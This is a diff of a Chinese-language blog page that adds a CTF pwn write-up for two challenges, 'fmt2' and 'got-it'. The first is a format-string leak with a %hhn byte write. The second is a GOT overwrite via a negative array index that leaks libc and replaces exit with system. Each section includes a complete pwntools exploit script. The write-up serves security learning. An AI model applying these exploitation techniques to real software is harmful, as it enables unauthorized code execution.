@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/about/"/>
+  <link rel="canonical" href="http://example.com/2024/09/02/iamorange--fmt2__got-it/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,19 +33,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>关于 - Hexo</title>
+  <title>Hexo</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="Hexo - John Doe - Hexo">
   
-<meta property="og:type" content="website">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/about/index.html">
+<meta property="og:url" content="http://example.com/2024/09/02/iamorange--fmt2__got-it/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="下面写关于自己的内容">
+<meta property="og:description" content="fmt2checksec一下，开了pie保护，nx保护运行一遍瞧瞧，有格式化字符串漏洞丢ida里反编译看看，可以看到，当参数a等于’deadeef’,就可以执行sys，看看a的位置吧进gdb调试一下吧，可以看到main的地址存放在栈中，可利用格式化字符串漏洞泄露出main 的地址，计算出基地址，加上参数a的偏移量，就可以获取参数a的真实地址，再利用利用格式化字符串漏洞往里写入’deadbeef’，">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2024-08-19T15:42:32.305Z">
-<meta property="article:modified_time" content="2024-08-19T15:42:32.305Z">
+<meta property="article:published_time" content="2024-09-02T07:14:02.205Z">
+<meta property="article:modified_time" content="2024-09-03T02:41:49.023Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2064,6 +2064,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
         <li><a id="s-comment" class="fa-solid fa-comments fa-fw" target="_self"  href="/" onclick="return false;" title="comment"></a></li>
         
+          <li><a id="s-toc" class="s-toc fa-solid fa-list fa-fw" target="_self"  href="/" onclick="return false;" title="toc"></a></li>
+        
       </ul>
     </div>
 		<div class="nav-main">
@@ -2323,7 +2325,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="none" class='cover-wrapper docs search' style="display: none;">
+      <div id="none" class='cover-wrapper post search' style="display: none;">
         
   <div class='cover-bg lazyload placeholder' data-bg="https://s2.loli.net/2024/08/20/XznLVif8uGoETrU.jpg"></div>
 
@@ -2393,9 +2395,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="safearea">
         <div class="body-wrapper">
           
-<div id="l_main" class=' no_sidebar'>
-  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-docs" id="docs" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/about/index.html">
+<div id="l_main" class=''>
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/02/iamorange--fmt2__got-it/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Hexo">
   </span>
@@ -2424,7 +2426,11 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <p>下面写关于自己的内容</p>
+    <h2 id="fmt2"><a href="#fmt2" class="headerlink" title="fmt2"></a>fmt2</h2><p>checksec一下，开了pie保护，nx保护<br /><img src="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725252512029-67691e52-9742-409f-acb2-55cc0a41cb35.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725252512029-67691e52-9742-409f-acb2-55cc0a41cb35.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />运行一遍瞧瞧，有格式化字符串漏洞<br /><img src="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725252691769-95305862-9682-4f9a-aa44-5519a88405e2.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725252691769-95305862-9682-4f9a-aa44-5519a88405e2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />丢ida里反编译看看，可以看到，当参数a等于’deadeef’,就可以执行sys，看看a的位置吧<br /><img src="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725252720934-d91fb8e7-9dfc-4a81-8d21-8b5f3e9cc3f8.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725252720934-d91fb8e7-9dfc-4a81-8d21-8b5f3e9cc3f8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/45870409/1725252758183-4027adc6-103e-48f0-9d71-e06c15640558.png#averageHue=%23fbfafa&clientId=u3dc1bf0b-ba19-4&from=paste&height=278&id=u3bee6d99&originHeight=414&originWidth=534&originalType=binary&ratio=1.4895833730697632&rotation=0&showTitle=false&size=26552&status=done&style=none&taskId=u760f4f68-0f9e-4d6c-bb3d-f35db400911&title=&width=358.4895009263712" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2024/png/45870409/1725252758183-4027adc6-103e-48f0-9d71-e06c15640558.png#averageHue=%23fbfafa&clientId=u3dc1bf0b-ba19-4&from=paste&height=278&id=u3bee6d99&originHeight=414&originWidth=534&originalType=binary&ratio=1.4895833730697632&rotation=0&showTitle=false&size=26552&status=done&style=none&taskId=u760f4f68-0f9e-4d6c-bb3d-f35db400911&title=&width=358.4895009263712" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br /><img src="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725252903601-3da3d586-458a-4bfb-b259-dcc5eaaba4e6.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725252903601-3da3d586-458a-4bfb-b259-dcc5eaaba4e6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />进gdb调试一下吧，可以看到main的地址存放在栈中，可利用格式化字符串漏洞泄露出main 的地址，计算出基地址，加上参数a的偏移量，就可以获取参数a的真实地址，再利用利用格式化字符串漏洞往里写入’deadbeef’，即可通过判断，执行sys<br /><img src="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725252982657-8a181b1f-4bbf-4f74-9590-91de2c124413.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725252982657-8a181b1f-4bbf-4f74-9590-91de2c124413.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />以下是exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">filename=&#x27;./fmt2&#x27;</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#p=remote(&#x27;boom.01130328.xyz&#x27;,36903)</span><br><span class="line">p=process(filename)</span><br><span class="line"></span><br><span class="line">pie=0x0000000000004048</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;Input your content: &#x27;)</span><br><span class="line">p.send(b&#x27;%41$p&#x27;)</span><br><span class="line">main_addr = int(p.recv(14),16)</span><br><span class="line">print(hex(main_addr))</span><br><span class="line">elf_addr=main_addr-elf.sym[&#x27;main&#x27;]</span><br><span class="line">a_addr=elf_addr+pie</span><br><span class="line"></span><br><span class="line">payload = b&quot;%239c%8$hhn&quot;.ljust(16,b&#x27;a&#x27;)+p64(a_addr) #\xef</span><br><span class="line">p.sendlineafter(b&#x27;content: &#x27;,payload)</span><br><span class="line"></span><br><span class="line">payload = b&quot;%190c%8$hhn&quot;.ljust(16,b&#x27;a&#x27;)+p64(a_addr+1) #\xbe</span><br><span class="line">p.sendlineafter(b&#x27;content: &#x27;,payload)</span><br><span class="line"></span><br><span class="line">payload = b&quot;%173c%8$hhn&quot;.ljust(16,b&#x27;a&#x27;)+p64(a_addr+2) #\ad</span><br><span class="line">p.sendlineafter(b&#x27;content: &#x27;,payload)</span><br><span class="line"></span><br><span class="line">payload = b&quot;%222c%8$hhn&quot;.ljust(16,b&#x27;a&#x27;)+p64(a_addr+3) #\xde</span><br><span class="line">p.sendlineafter(b&#x27;content: &#x27;,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><a name="iSrTL"></a></p>
+<h2 id="got-it"><a href="#got-it" class="headerlink" title="got-it"></a>got-it</h2><p>got表劫持漏洞，checksec一下，partial relro，可以修改plt&#x2F;got表<br /><img src="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725259904106-2de76d7b-661d-42d5-a47e-3ca8709afd00.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725259904106-2de76d7b-661d-42d5-a47e-3ca8709afd00.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />进ida反编译看看，点进各个函数看看<br /><img src="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725259979669-2028ea0c-3209-449d-9e1d-f45aa5eea373.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725259979669-2028ea0c-3209-449d-9e1d-f45aa5eea373.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br /><img src="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725260013354-6b16daf9-b6c1-4821-a9f8-6eb314b9b87a.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725260013354-6b16daf9-b6c1-4821-a9f8-6eb314b9b87a.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/45870409/1725260021922-1883b8e3-18ed-4161-ab22-07faa0d9c74b.png#averageHue=%23fbfbfb&clientId=u3dc1bf0b-ba19-4&from=paste&height=185&id=u28532e3b&originHeight=276&originWidth=519&originalType=binary&ratio=1.4895833730697632&rotation=0&showTitle=false&size=18025&status=done&style=none&taskId=u7f483f67-344c-4ef6-b557-18217c6a8b3&title=&width=348.4195711250686" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2024/png/45870409/1725260021922-1883b8e3-18ed-4161-ab22-07faa0d9c74b.png#averageHue=%23fbfbfb&clientId=u3dc1bf0b-ba19-4&from=paste&height=185&id=u28532e3b&originHeight=276&originWidth=519&originalType=binary&ratio=1.4895833730697632&rotation=0&showTitle=false&size=18025&status=done&style=none&taskId=u7f483f67-344c-4ef6-b557-18217c6a8b3&title=&width=348.4195711250686" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/45870409/1725260029463-d25c9a20-a7eb-4715-8733-60fe60f834a5.png#averageHue=%23fbfbfb&clientId=u3dc1bf0b-ba19-4&from=paste&height=183&id=u3ca675d1&originHeight=272&originWidth=672&originalType=binary&ratio=1.4895833730697632&rotation=0&showTitle=false&size=18411&status=done&style=none&taskId=u4b5bbc17-5d32-4ba1-b657-97a882511b7&title=&width=451.13285509835475" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2024/png/45870409/1725260029463-d25c9a20-a7eb-4715-8733-60fe60f834a5.png#averageHue=%23fbfbfb&clientId=u3dc1bf0b-ba19-4&from=paste&height=183&id=u3ca675d1&originHeight=272&originWidth=672&originalType=binary&ratio=1.4895833730697632&rotation=0&showTitle=false&size=18411&status=done&style=none&taskId=u4b5bbc17-5d32-4ba1-b657-97a882511b7&title=&width=451.13285509835475" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/45870409/1725260936939-1bc6ac0f-ecc2-4d01-a3e9-1accab517cb6.png#averageHue=%23f8f7f7&clientId=u3dc1bf0b-ba19-4&from=paste&height=83&id=u9b18bfd9&originHeight=124&originWidth=377&originalType=binary&ratio=1.4895833730697632&rotation=0&showTitle=false&size=5833&status=done&style=none&taskId=u32c952bb-df9b-420b-9b5f-8c5c8979635&title=&width=253.09090233940438" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2024/png/45870409/1725260936939-1bc6ac0f-ecc2-4d01-a3e9-1accab517cb6.png#averageHue=%23f8f7f7&clientId=u3dc1bf0b-ba19-4&from=paste&height=83&id=u9b18bfd9&originHeight=124&originWidth=377&originalType=binary&ratio=1.4895833730697632&rotation=0&showTitle=false&size=5833&status=done&style=none&taskId=u32c952bb-df9b-420b-9b5f-8c5c8979635&title=&width=253.09090233940438" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />可以通过输入，将v1赋值负数，实现数组越界，edit函数可以对其实现修改，show函数可以泄露其地址，trick函数中exit()函数的参数正好为binsh，将exit_got地址改为system，执行exit即可拿到控制权<br /><img src="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725260182360-dedee50d-5709-4a1f-8834-07fce1c7af54.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/cwj-happy/picgo/main/1725260182360-dedee50d-5709-4a1f-8834-07fce1c7af54.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/45870409/1725260378999-35b327c0-a76b-4e22-94ee-937c75b80fcd.png#averageHue=%23f8f7f5&clientId=u3dc1bf0b-ba19-4&from=paste&height=193&id=u830a3fef&originHeight=288&originWidth=1140&originalType=binary&ratio=1.4895833730697632&rotation=0&showTitle=false&size=56891&status=done&style=none&taskId=ud773c470-a34d-4fe4-bf44-c185e98b885&title=&width=765.3146648989947" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2024/png/45870409/1725260378999-35b327c0-a76b-4e22-94ee-937c75b80fcd.png#averageHue=%23f8f7f5&clientId=u3dc1bf0b-ba19-4&from=paste&height=193&id=u830a3fef&originHeight=288&originWidth=1140&originalType=binary&ratio=1.4895833730697632&rotation=0&showTitle=false&size=56891&status=done&style=none&taskId=ud773c470-a34d-4fe4-bf44-c185e98b885&title=&width=765.3146648989947" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png"><br />计算出puts_got地址距离list为0x88 当v1为-17时，即可到达puts_got表地址，通过show函数泄露puts_got地址，算出libc基地址，通过计算sys_addr&#x3D;libc_base+elf.sym[‘system’]<br />拿到system地址，通过计算，exit距list 0x58 当v1为-8时即可到达exit地址，通过edit函数，将exit地址改为system，最后运行trick函数即可<br />以下是exp<br />有个小问题，这里附件给的libc文件应该是远端用给的，程序跑在本地应该用本地的libc，跑起来正如我所料</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">filename=&#x27;./got-it&#x27;</span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#p=remote(&#x27;boom.01130328.xyz&#x27;,36903)</span><br><span class="line">p=process(filename)</span><br><span class="line"></span><br><span class="line">elf=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">p.sendline(b&#x27;2&#x27;)</span><br><span class="line">p.sendlineafter(&quot;Input student id: &quot;,b&#x27;-17&#x27;)</span><br><span class="line">puts_addr=u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">print(hex(puts_addr))</span><br><span class="line">#pause()</span><br><span class="line">libc_base=puts_addr-elf.sym[&#x27;puts&#x27;]</span><br><span class="line">sys_addr=libc_base+elf.sym[&#x27;system&#x27;]</span><br><span class="line">print(hex(sys_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">p.sendline(b&#x27;1&#x27;)</span><br><span class="line">p.sendlineafter(&quot;Input student id: &quot;,b&#x27;-11&#x27;)</span><br><span class="line">p.sendlineafter(&quot;Input student name: &quot;,p64(sys_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">p.sendline(b&#x27;8227&#x27;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
   </div>
   
@@ -2448,6 +2454,73 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class='article-meta' id="bottom">
     <div class='new-meta-box'>
       
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-09-03T10:41:49+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Sep 3, 2024</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2024/09/02/iamorange--fmt2__got-it/&title= - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2024/09/02/iamorange--fmt2__got-it/&title= - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2024/09/02/iamorange--fmt2__got-it/&title= - Hexo&summary="
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
     </div>
     <!-- Custom Files bottomMeta begin -->
     
@@ -2458,6 +2531,24 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   
 
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2024/09/01/Newstar_week2/'>
+          <p class='title'>Sep 2, 2024<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>Newstar_week2ret2libc简单的看看开了什么保护吧，没开pie
+
+运行一下看看
+
+丢ida里反编译看看，可以栈溢出，很普通的ret2libc
+
+
+以下是exp
+123456789...</p>
+        </a>
+      
+    </div>
   
   <!-- Custom Files postEnd begin-->
   
@@ -2470,7 +2561,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/about/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2024/09/02/iamorange--fmt2__got-it/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2488,8 +2579,35 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
 
+  
+    
+    
+      
+    
+  
+
 
 <div class="widget-sticky pjax">
+
+  
+  
+
+
+  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
+    
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fmt2"><span class="toc-text">fmt2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#got-it"><span class="toc-text">got-it</span></a></li></ol>
+    </div>
+  </section>
+
+  
 
 </div>
 
@@ -3082,7 +3200,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"关于","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/about/index.html"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/about/index.html","wordCount":0,"datePublished":"2024-08-19T15:42:32.305Z","dateModified":"2024-08-19T15:42:32.305Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2024/09/02/iamorange--fmt2__got-it/"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2024/09/02/iamorange--fmt2__got-it/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Hexo","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2024/09/02/iamorange--fmt2__got-it/","wordCount":0,"datePublished":"2024-09-02T07:14:02.205Z","dateModified":"2024-09-03T02:41:49.023Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
